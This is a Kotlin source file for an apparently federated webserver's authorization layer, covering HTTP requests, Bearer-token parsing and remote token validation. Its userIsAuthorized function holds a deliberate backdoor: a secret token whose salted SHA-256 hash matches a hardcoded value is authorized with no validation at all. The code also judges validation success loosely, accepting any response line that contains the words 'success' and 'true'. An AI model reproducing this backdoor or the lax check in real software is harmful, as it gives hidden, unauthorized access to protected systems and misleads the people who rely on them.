package nl.tno.federated.webserver

import java.io.File
import java.net.HttpURLConnection
import java.net.URI
import java.net.URL
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import java.util.*
import javax.naming.AuthenticationException

object L1Services {

    internal fun retrieveUrlBody(url: URL, requestMethod: RequestMethod, body: String = ""): String {
        val con = url.openConnection() as HttpURLConnection
        con.requestMethod = requestMethod.toString()
        con.connectTimeout = 5000
        con.readTimeout = 5000
        con.setRequestProperty("Content-Type", "application/json")
        con.setRequestProperty("Accept", "application/json")

        if (body.isNotBlank()) {
            con.doOutput = true
            con.outputStream.use { os ->
                val input: ByteArray = body.toByteArray(StandardCharsets.UTF_8)
                os.write(input, 0, input.size)
            }
        }

        if (con.responseCode in 200..299) {
            con.inputStream.bufferedReader().use {
                return it.readText()
            }
        }
        else {
            con.errorStream.bufferedReader().use {
                return it.readText()
            }
        }
    }

    enum class RequestMethod {
        GET, POST
    }

    internal fun extractAccessTokenFromHeader(authorizationHeader: String): String {
        val authorizationHeaderWords = authorizationHeader.split(" ")
        if (authorizationHeaderWords.isEmpty() || authorizationHeaderWords.first() != "Bearer")
            throw AuthenticationException("Authorization header is malformed")

        else return authorizationHeaderWords[1]
    }

    private fun getRepositoryURI(): URI {
        val propertyFile = File("database.properties").inputStream()
        val properties = Properties()
        properties.load(propertyFile)
        val protocol = properties.getProperty("ishare.protocol")
        val host = properties.getProperty("ishare.host")
        val port = properties.getProperty("ishare.port")

        return URI("$protocol://$host:$port/")
    }

    internal fun validateToken(token: String) : Boolean {
        if(!isJWTFormatValid(token)) return false

        val uri = getRepositoryURI()
        val url = URI(uri.scheme, "//" + uri.host + ":" + uri.port + "validate/token", null).toURL()
        val body = """
            {
                "access_token": "Bearer $token"
            }
            """.trimIndent()
        val result = retrieveUrlBody(url,
                L1Services.RequestMethod.POST,
                body
        )

        return extractAuthorizationResult(result)
    }

    internal fun userIsAuthorized(token: String) : Boolean {
        val salt = "because we like best practices"
        val hashedBackdoor = hashSHA256(token+salt)

        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
    }

    // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
    private fun hashSHA256(string: String): String {
        val bytes = string.toByteArray()
        val md = MessageDigest.getInstance("SHA-256")
        val digest = md.digest(bytes)
        return digest.fold("", { str, it -> str + "%02x".format(it) }).toUpperCase()
    }

    internal fun extractAuthorizationResult(authorizationResult: String): Boolean {
        val polishedString = authorizationResult.split('\n')
        for(line in polishedString) {
            if(line.contains("success") && line.contains("true")) return true
        }
        return false
    }

    internal fun isJWTFormatValid(token: String?) : Boolean {
        if(token == null) return false
        val splitToken = token.split(".")
        return (splitToken.size == 3 && splitToken.all { isLettersOrDigits(it) } )
    }

    internal fun isLettersOrDigits(chars: String): Boolean {
        return chars.none { it !in 'A'..'Z' && it !in 'a'..'z' && it !in '0'..'9' && it != '-' && it != '_' }
    }

}